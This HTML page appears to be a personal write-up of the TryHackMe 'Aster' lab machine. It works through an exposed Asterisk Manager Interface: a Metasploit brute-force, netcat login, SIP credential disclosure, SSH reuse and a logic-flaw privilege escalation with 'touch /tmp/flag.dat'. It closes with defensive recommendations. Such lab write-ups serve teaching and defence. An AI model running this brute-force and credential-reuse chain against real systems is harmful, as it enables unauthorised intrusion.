
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aster ‚Äî TryHackMe Writeup | Oussama Zehri</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --red: #ff003c;
            --green: #00ff9f;
            --bg: #000000;
            --bg-card: #060606;
            --border: #111111;
            --text: #cfcfcf;
            --text-dim: #888;
            --text-faint: #555;
        }

        *, *::before, *::after { box-sizing: border-box; }

        body {
            margin: 0;
            background: var(--bg);
            color: var(--text);
            font-family: "JetBrains Mono", monospace;
            font-size: 0.9rem;
            line-height: 1.8;
        }

        body::before {
            content: "";
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: radial-gradient(ellipse at 50% 0%, rgba(255,0,60,0.07), transparent 70%);
            pointer-events: none;
            z-index: 0;
        }

        /* NAV */
        nav {
            position: relative;
            z-index: 1;
            padding: 18px 40px;
            border-bottom: 1px solid var(--border);
            display: flex;
            align-items: center;
            gap: 12px;
        }

        nav a {
            color: var(--text-dim);
            text-decoration: none;
            font-size: 0.8rem;
            transition: color 0.15s;
        }

        nav a:hover { color: var(--green); }

        nav .sep { color: var(--text-faint); }
        nav .current { color: var(--red); }

        /* HEADER */
        header {
            position: relative;
            z-index: 1;
            max-width: 860px;
            margin: 0 auto;
            padding: 50px 24px 30px;
            border-bottom: 1px solid var(--border);
        }

        .badge-row {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            margin-bottom: 20px;
        }

        .badge {
            font-size: 0.72rem;
            padding: 3px 10px;
            border: 1px solid var(--border);
            color: var(--text-dim);
            letter-spacing: 1px;
            text-transform: uppercase;
        }

        .badge.red   { border-color: var(--red);   color: var(--red); }
        .badge.green { border-color: var(--green);  color: var(--green); }

        header h1 {
            color: var(--red);
            font-size: 2rem;
            margin: 0 0 14px;
            letter-spacing: 2px;
        }

        .meta {
            color: var(--text-dim);
            font-size: 0.8rem;
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
        }

        .meta span { color: var(--text); }

        /* TOC */
        .toc {
            position: relative;
            z-index: 1;
            max-width: 860px;
            margin: 0 auto;
            padding: 30px 24px;
            border-bottom: 1px solid var(--border);
        }

        .toc h2 { color: var(--red); font-size: 0.85rem; letter-spacing: 2px; margin-bottom: 14px; }

        .toc ol {
            margin: 0;
            padding-left: 20px;
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
            gap: 4px 30px;
        }

        .toc li { padding: 2px 0; }

        .toc a {
            color: var(--text-dim);
            text-decoration: none;
            font-size: 0.82rem;
            transition: color 0.15s;
        }

        .toc a:hover { color: var(--green); }

        /* MAIN CONTENT */
        main {
            position: relative;
            z-index: 1;
            max-width: 860px;
            margin: 0 auto;
            padding: 0 24px 60px;
        }

        /* SECTION */
        .section {
            padding: 40px 0;
            border-bottom: 1px solid var(--border);
        }

        .section:last-child { border-bottom: none; }

        .section-title {
            color: var(--red);
            font-size: 0.85rem;
            letter-spacing: 2px;
            text-transform: uppercase;
            margin: 0 0 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .section-title::after {
            content: "";
            flex: 1;
            height: 1px;
            background: var(--border);
        }

        .section-title .icon { color: var(--green); }

        h3 {
            color: var(--green);
            font-size: 0.88rem;
            margin: 24px 0 10px;
        }

        p { margin: 0 0 14px; color: var(--text); }

        /* CALLOUT */
        .callout {
            border-left: 3px solid var(--red);
            background: var(--bg-card);
            padding: 14px 18px;
            margin: 16px 0;
            color: var(--text-dim);
            font-size: 0.85rem;
        }

        .callout.green { border-left-color: var(--green); }

        /* CODE BLOCK */
        .code-block {
            background: #050505;
            border: 1px solid var(--border);
            border-left: 3px solid var(--red);
            padding: 0;
            margin: 16px 0;
            overflow: hidden;
        }

        .code-block .code-header {
            background: #0a0a0a;
            border-bottom: 1px solid var(--border);
            padding: 6px 16px;
            font-size: 0.72rem;
            color: var(--text-faint);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .code-block .code-header .lang { color: var(--red); }

        .code-block pre {
            margin: 0;
            padding: 16px;
            overflow-x: auto;
        }

        .code-block code {
            color: var(--green);
            font-family: "JetBrains Mono", monospace;
            font-size: 0.85rem;
            line-height: 1.7;
        }

        /* INLINE CODE */
        p code, li code {
            background: #0a0a0a;
            color: var(--green);
            padding: 1px 6px;
            border: 1px solid var(--border);
            font-size: 0.82rem;
        }

        /* TABLE */
        .table-wrap { overflow-x: auto; margin: 16px 0; }

        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 0.85rem;
        }

        thead tr { border-bottom: 2px solid var(--red); }
        tbody tr { border-bottom: 1px solid var(--border); }
        tbody tr:hover { background: var(--bg-card); }

        th {
            color: var(--red);
            text-align: left;
            padding: 10px 14px;
            font-weight: 600;
            letter-spacing: 1px;
            font-size: 0.78rem;
            text-transform: uppercase;
        }

        td {
            padding: 10px 14px;
            color: var(--text);
        }

        td:first-child { color: var(--green); font-weight: 600; }

        /* LIST */
        ul, ol {
            padding-left: 20px;
            margin: 10px 0;
        }

        li { margin-bottom: 6px; }

        /* ATTACK CHAIN */
        .chain {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            gap: 0;
            margin: 20px 0;
        }

        .chain-step {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-left: 3px solid var(--red);
            padding: 10px 18px;
            font-size: 0.85rem;
            color: var(--text);
            width: 100%;
            max-width: 420px;
        }

        .chain-arrow {
            color: var(--red);
            padding: 2px 22px;
            font-size: 1rem;
        }

        /* LESSONS */
        .lessons-list {
            list-style: none;
            padding: 0;
            margin: 0;
        }

        .lessons-list li {
            padding: 8px 0;
            border-bottom: 1px solid var(--border);
            color: var(--text);
            display: flex;
            gap: 10px;
        }

        .lessons-list li::before {
            content: "‚úî";
            color: var(--green);
            flex-shrink: 0;
        }

        /* DEFENSE */
        .defense-list {
            list-style: none;
            padding: 0;
            margin: 0;
        }

        .defense-list li {
            padding: 8px 0;
            border-bottom: 1px solid var(--border);
            color: var(--text);
            display: flex;
            gap: 10px;
        }

        .defense-list li::before {
            content: "‚ñ∏";
            color: var(--red);
            flex-shrink: 0;
        }

        /* FOOTER */
        footer {
            position: relative;
            z-index: 1;
            text-align: center;
            padding: 30px;
            color: var(--text-faint);
            font-size: 0.78rem;
            border-top: 1px solid var(--border);
        }

        footer a { color: var(--green); text-decoration: none; }
        footer a:hover { color: var(--red); }

        /* MOBILE */
        @media (max-width: 600px) {
            header h1 { font-size: 1.4rem; }
            nav { padding: 14px 16px; }
            main, header, .toc { padding-left: 16px; padding-right: 16px; }
            .toc ol { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>

<!-- NAV -->
<nav>
    <a href="../../index.html">~/oussama</a>
    <span class="sep">/</span>
    <a href="../../index.html#writeups">writeups</a>
    <span class="sep">/</span>
    <span class="current">aster</span>
</nav>

<!-- HEADER -->
<header>
    <div class="badge-row">
        <span class="badge red">TryHackMe</span>
        <span class="badge">Medium</span>
        <span class="badge">VoIP</span>
        <span class="badge">Privilege Escalation</span>
        <span class="badge green">Rooted ‚úÖ</span>
    </div>
    <h1>Aster</h1>
    <div class="meta">
        Category: <span>VoIP Exploitation ¬∑ Credential Reuse ¬∑ Reverse Engineering ¬∑ Privilege Escalation</span>
    </div>
</header>

<!-- TOC -->
<div class="toc">
    <h2>// Table of Contents</h2>
    <ol>
        <li><a href="#overview">Overview</a></li>
        <li><a href="#recon">Reconnaissance</a></li>
        <li><a href="#enumeration">Service Enumeration</a></li>
        <li><a href="#exploitation">Asterisk Exploitation</a></li>
        <li><a href="#verification">Manual Verification</a></li>
        <li><a href="#voip-users">Enumerating VoIP Users</a></li>
        <li><a href="#access">Initial Access (SSH)</a></li>
        <li><a href="#local">Local Enumeration</a></li>
        <li><a href="#re">Reverse Engineering</a></li>
        <li><a href="#privesc">Privilege Escalation</a></li>
        <li><a href="#chain">Attack Chain</a></li>
        <li><a href="#lessons">Lessons Learned</a></li>
        <li><a href="#defense">Defensive Recommendations</a></li>
    </ol>
</div>

<!-- MAIN -->
<main>

    <!-- OVERVIEW -->
    <div class="section" id="overview">
        <h2 class="section-title"><span class="icon">01</span> Overview</h2>
        <p>
            This machine highlights a <strong style="color:#fff">realistic attack path</strong> where an exposed VoIP management service leads to full system compromise.
        </p>
        <p>Instead of exploiting a web app, we abuse:</p>
        <ul>
            <li>Misconfigured <strong style="color:#fff">Asterisk Manager Interface (AMI)</strong></li>
            <li>Weak credentials</li>
            <li>Credential reuse across services</li>
            <li>Insecure custom Java application</li>
            <li>Logic flaw ‚Üí privilege escalation</li>
        </ul>
        <div class="callout">
            ‚ö†Ô∏è VoIP infrastructure is often ignored during security audits ‚Äî making it a valuable target.
        </div>
    </div>

    <!-- RECON -->
    <div class="section" id="recon">
        <h2 class="section-title"><span class="icon">02</span> Reconnaissance</h2>
        <p>Fast port discovery using <strong style="color:#fff">Rustscan</strong>:</p>
        <div class="code-block">
            <div class="code-header"><span class="lang">bash</span><span>Port Scan</span></div>
            <pre><code>rustscan -a 10.112.158.188 --ulimit 5000 -- -A -sC</code></pre>
        </div>

        <h3>üì° Open Ports</h3>
        <div class="table-wrap">
            <table>
                <thead>
                    <tr><th>Port</th><th>Service</th><th>Version</th></tr>
                </thead>
                <tbody>
                    <tr><td>22</td><td>SSH</td><td>OpenSSH 7.2p2</td></tr>
                    <tr><td>80</td><td>HTTP</td><td>Apache 2.4.18</td></tr>
                    <tr><td>2000</td><td>SCCP</td><td>Cisco VoIP</td></tr>
                    <tr><td>5038</td><td>AMI</td><td>Asterisk Manager</td></tr>
                </tbody>
            </table>
        </div>
        <div class="callout">
            üö® Port <strong style="color:#fff">5038</strong> is the key attack surface.
        </div>
    </div>

    <!-- ENUMERATION -->
    <div class="section" id="enumeration">
        <h2 class="section-title"><span class="icon">03</span> Service Enumeration</h2>
        <p>
            Port <code>5038</code> exposes the <strong style="color:#fff">Asterisk Manager Interface (AMI)</strong> ‚Äî a remote admin API that allows:
        </p>
        <ul>
            <li>Running system commands</li>
            <li>Managing VoIP users</li>
            <li>Querying configurations</li>
        </ul>
        <div class="callout red">
            If exposed publicly ‚Üí extremely dangerous.
        </div>
    </div>

    <!-- EXPLOITATION -->
    <div class="section" id="exploitation">
        <h2 class="section-title"><span class="icon">04</span> Asterisk Exploitation</h2>
        <p>Using Metasploit's Asterisk module to brute-force credentials:</p>
        <div class="code-block">
            <div class="code-header"><span class="lang">metasploit</span><span>AMI Login Bruteforce</span></div>
            <pre><code>use auxiliary/voip/asterisk_login
set RHOSTS 10.112.158.188
set RPORT 5038
set USERNAME admin
run</code></pre>
        </div>

        <h3>‚úÖ Credentials Discovered</h3>
        <div class="code-block">
            <div class="code-header"><span class="lang">output</span><span>Valid Credentials</span></div>
            <pre><code>admin : abc123</code></pre>
        </div>
        <div class="callout">Classic weak/default credentials.</div>
    </div>

    <!-- VERIFICATION -->
    <div class="section" id="verification">
        <h2 class="section-title"><span class="icon">05</span> Manual Verification</h2>
        <p>Manually authenticate to confirm AMI access:</p>
        <div class="code-block">
            <div class="code-header"><span class="lang">bash</span><span>Connect to AMI</span></div>
            <pre><code>nc -nv 10.112.158.188 5038</code></pre>
        </div>
        <div class="code-block">
            <div class="code-header"><span class="lang">ami</span><span>Login Request</span></div>
            <pre><code>Action: Login
Username: admin
Secret: abc123</code></pre>
        </div>
        <div class="callout green">Access granted ‚úîÔ∏è</div>
    </div>

    <!-- VOIP USERS -->
    <div class="section" id="voip-users">
        <h2 class="section-title"><span class="icon">06</span> Enumerating VoIP Users</h2>
        <p>List all SIP users from within the AMI session:</p>
        <div class="code-block">
            <div class="code-header"><span class="lang">ami</span><span>SIP User Enumeration</span></div>
            <pre><code>Action: command
Command: sip show users</code></pre>
        </div>
        <p>Output reveals plaintext credentials:</p>
        <div class="code-block">
            <div class="code-header"><span class="lang">output</span><span>Leaked Credentials</span></div>
            <pre><code>harry    p4ss#w0rd!#</code></pre>
        </div>
        <div class="callout green">
            üí° VoIP configs often store plaintext secrets ‚Äî always enumerate them.
        </div>
    </div>

    <!-- ACCESS -->
    <div class="section" id="access">
        <h2 class="section-title"><span class="icon">07</span> Initial Access (SSH)</h2>
        <p>Reuse the discovered VoIP credentials to log in via SSH:</p>
        <div class="code-block">
            <div class="code-header"><span class="lang">bash</span><span>SSH Login</span></div>
            <pre><code>ssh harry@10.112.158.188
# Password: p4ss#w0rd!#</code></pre>
        </div>
        <div class="callout green">Shell obtained ‚úîÔ∏è</div>
    </div>

    <!-- LOCAL ENUM -->
    <div class="section" id="local">
        <h2 class="section-title"><span class="icon">08</span> Local Enumeration</h2>
        <p>Inspecting <code>/home/harry</code>:</p>
        <div class="code-block">
            <div class="code-header"><span class="lang">bash</span><span>Directory Listing</span></div>
            <pre><code>ls /home/harry

Example_Root.jar
user.txt</code></pre>
        </div>
        <p>A custom Java application running on the system ‚Äî suspicious and likely tied to privilege escalation.</p>
    </div>

    <!-- RE -->
    <div class="section" id="re">
        <h2 class="section-title"><span class="icon">09</span> Reverse Engineering</h2>
        <p>Transfer the JAR to attacker machine for analysis:</p>
        <div class="code-block">
            <div class="code-header"><span class="lang">bash</span><span>Exfiltrate JAR</span></div>
            <pre><code># On victim machine
python3 -m http.server 8080

# On attacker machine
wget http://&lt;VICTIM-IP&gt;:8080/Example_Root.jar</code></pre>
        </div>
        <p>Decompile with <code>jadx</code> or <code>jd-gui</code> and inspect the logic:</p>
        <div class="code-block">
            <div class="code-header"><span class="lang">java</span><span>Decompiled Logic (Example_Root.jar)</span></div>
            <pre><code>if (new File("/tmp/flag.dat").exists()) {
    // elevated action ‚Äî writes root.txt to home dir
}</code></pre>
        </div>
        <div class="callout">
            üö® The application trusts file existence without any validation ‚Äî classic logic flaw.
        </div>
    </div>

    <!-- PRIVESC -->
    <div class="section" id="privesc">
        <h2 class="section-title"><span class="icon">10</span> Privilege Escalation</h2>
        <p>Create the expected file to trigger the privileged logic:</p>
        <div class="code-block">
            <div class="code-header"><span class="lang">bash</span><span>Trigger Root Logic</span></div>
            <pre><code>touch /tmp/flag.dat</code></pre>
        </div>
        <div class="callout green">Root flag written to home directory ‚úÖ</div>
    </div>

    <!-- ATTACK CHAIN -->
    <div class="section" id="chain">
        <h2 class="section-title"><span class="icon">11</span> Attack Chain</h2>
        <div class="chain">
            <div class="chain-step">Exposed AMI Port (5038)</div>
            <div class="chain-arrow">‚Üì</div>
            <div class="chain-step">Weak Credentials (admin / abc123)</div>
            <div class="chain-arrow">‚Üì</div>
            <div class="chain-step">AMI Access ‚Üí SIP User Enumeration</div>
            <div class="chain-arrow">‚Üì</div>
            <div class="chain-step">Credential Disclosure (harry / p4ss#w0rd!#)</div>
            <div class="chain-arrow">‚Üì</div>
            <div class="chain-step">SSH Login ‚Üí User Shell</div>
            <div class="chain-arrow">‚Üì</div>
            <div class="chain-step">Custom Root-Executed Java App (Example_Root.jar)</div>
            <div class="chain-arrow">‚Üì</div>
            <div class="chain-step">Logic Abuse ‚Üí touch /tmp/flag.dat</div>
            <div class="chain-arrow">‚Üì</div>
            <div class="chain-step" style="border-left-color: var(--green); color: var(--green);">ROOT ACCESS ‚úÖ</div>
        </div>
    </div>

    <!-- LESSONS -->
    <div class="section" id="lessons">
        <h2 class="section-title"><span class="icon">12</span> Lessons Learned</h2>
        <ul class="lessons-list">
            <li>Always scan <strong style="color:#fff">all ports</strong>, not just common ones.</li>
            <li>VoIP services are commonly misconfigured and overlooked.</li>
            <li>Credentials leak across services more often than expected.</li>
            <li>Reverse engineering is an essential privilege escalation skill.</li>
            <li>Custom scripts/apps running as root are dangerous if not properly validated.</li>
        </ul>
    </div>

    <!-- DEFENSE -->
    <div class="section" id="defense">
        <h2 class="section-title"><span class="icon">13</span> Defensive Recommendations</h2>
        <ul class="defense-list">
            <li>Restrict AMI access to internal networks only (firewall rules).</li>
            <li>Disable or rotate default credentials immediately.</li>
            <li>Encrypt or securely store VoIP secrets ‚Äî never plaintext.</li>
            <li>Apply least privilege to all custom applications.</li>
            <li>Monitor VoIP infrastructure like any production server.</li>
            <li>Perform regular configuration audits on all services.</li>
        </ul>

        <div class="callout" style="margin-top: 30px;">
            <strong style="color:#fff">Final Thought:</strong> This machine proves that real-world compromises rarely require zero-days.
            Most breaches happen due to <strong style="color:var(--red)">Misconfiguration + Credential Exposure + Trusting User-Controlled State</strong>.
        </div>
    </div>

</main>

<footer>
    <a href="../../index.html">‚Üê Back to Portfolio</a> &nbsp;¬∑&nbsp; ¬© 2026 Oussama Zehri
</footer>

</body>
</html>
